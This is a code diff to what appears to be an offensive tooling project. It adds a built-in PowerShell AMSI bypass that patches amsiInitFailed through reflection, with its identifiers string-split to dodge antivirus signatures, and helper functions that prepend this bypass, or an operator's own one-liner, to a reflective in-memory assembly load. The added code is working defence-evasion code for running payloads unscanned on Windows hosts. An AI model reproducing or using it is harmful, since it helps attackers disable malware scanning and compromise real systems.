@@ -28,6 +28,42 @@ STALE_DAYS = 14
 UNTESTED, CAUGHT, STALE, GREEN = "untested", "caught", "stale", "green"
 
 
+#: A best-effort AMSI bypass for an in-memory managed load: patch ``amsiInitFailed`` so the
+#: session's later ``Assembly::Load`` isn't scanned. The identifiers are string-split to dodge
+#: the naive ``AmsiUtils``/``amsiInitFailed`` signatures — still *behaviourally* detectable on a
+#: hardened/EDR host, so it's a starting point, not a guarantee. An operator who has a bypass
+#: that lands in their target env supplies it verbatim via ``config set amsi_bypass=<oneliner>``.
+BUILTIN_AMSI = (
+    "$x=[Ref].Assembly.GetType(('Sys'+'tem.Manage'+'ment.Auto'+'mation.Am'+'siUt'+'ils'));"
+    "$x.GetField(('am'+'siInit'+'Failed'),'NonPublic,Static').SetValue($null,$true);"
+)
+
+_AMSI_ON = {"on", "yes", "true", "1", "default", "builtin"}
+_AMSI_OFF = {"", "off", "no", "false", "0", "none"}
+
+
+def amsi_prefix(value):
+    """PowerShell snippet to prepend to an in-memory load, resolved from ``amsi_bypass`` config.
+
+    Off/unset -> ``""`` (no bypass — the default). ``on``/``default`` -> :data:`BUILTIN_AMSI`.
+    Anything else is taken as the operator's own one-liner. A trailing ``"; "`` is ensured so
+    it chains cleanly before the reflective load.
+    """
+    v = (value or "").strip()
+    if v.lower() in _AMSI_OFF:
+        return ""
+    snippet = BUILTIN_AMSI if v.lower() in _AMSI_ON else v
+    return snippet.rstrip("; ") + "; "
+
+
+def amsi_label(value):
+    """Short human label for the resolved bypass — for escalate output. None when off."""
+    v = (value or "").strip()
+    if v.lower() in _AMSI_OFF:
+        return None
+    return "built-in" if v.lower() in _AMSI_ON else "custom"
+
+
 @dataclass(frozen=True)
 class Technique:
     """One delivery/evasion technique and the properties that set its detection risk."""
